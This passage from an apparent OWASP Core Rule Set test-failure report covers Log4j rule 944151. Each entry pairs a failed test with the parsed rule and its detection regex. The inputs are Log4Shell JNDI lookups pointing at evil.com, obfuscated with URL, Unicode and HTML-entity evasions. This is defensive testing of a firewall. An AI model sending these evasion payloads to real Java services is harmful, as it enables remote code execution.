          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 19,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 19,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%26%2336%3B%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 20,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 20,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026lbrace;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 21,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 21,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026#123;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 22,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 22,
      "desc" : "Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24&lcub;\\u006A&#110;di:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 23,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}",
            "Content-Type" : "text/html"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]*(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944151
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944151",
    "test_id" : 24,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon",
    "cause" : "failed expect_id check: 944151 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026lbracejndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944151 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944151,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It is a re-iteration of said rule without the curly bracket distance limiter"
        }, {
          "type" : "Comment",
          "text" : " between the nested \"${\". This is prone to backtracking and therefore a potential"
        }, {
          "type" : "Comment",
          "text" : " DoS problem for backtracking regular expression engines (e.g. PCRE2), but it also avoids evasions that fill the space between the nested"
        }, {
          "type" : "Comment",
          "text" : " elements with arbitrary data."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944151.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944151"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
